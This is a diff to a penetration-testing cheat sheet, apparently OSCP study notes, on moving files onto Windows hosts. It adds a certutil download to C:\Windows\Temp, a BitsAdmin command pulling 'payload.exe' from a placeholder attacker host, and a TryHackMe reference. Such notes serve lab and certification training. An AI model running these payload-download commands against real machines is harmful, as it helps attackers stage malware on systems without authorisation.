@@ -85,6 +85,7 @@ xcopy \\$ip\scriptserver\$scriptname-here
 ## CertUtil
 ```powershell
 certutil.exe -urlcache -split -f "http://$IP/$FILE"
+certutil.exe -urlcache -split -f "http://$IP/$FILE" C:\Windows\Temp\$file
 ```
 
 **TFTP** (Installed by default up to Windows XP and 2003, In Windows 7, 2008 and above needs to be explicitly added. For this reason tftp not ideal file transfer protocol in most situations.) [ref](https://github.com/pythonmaster41/Go-For-OSCP)
@@ -192,9 +193,17 @@ See [[Powercat-Cheatsheet]] for more, but to file transfers with powercat:
 powercat -c 10.10.10.10 -p 54321 -i C:\Users\Administrator\powercat.ps1
 ```
 
+
+## BitsAdmin
+[BitsAdmin Documentation](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-transfer) 
+```shell-session
+bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe
+```
+
+
 ## References
 [hakluke](https://hakluke.medium.com/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97)
 [pythonmaster41](https://github.com/pythonmaster41/Go-For-OSCP)
 [hackersinterview](https://hackersinterview.com/oscp/oscp-cheatsheet-windows-file-transfer-techniques/)
-
+[THM Room Living off the Land](https://tryhackme.com/room/livingofftheland)
 [sushant747](https://sushant747.gitbooks.io/total-oscp-guide/content/transfering_files_to_windows.html)
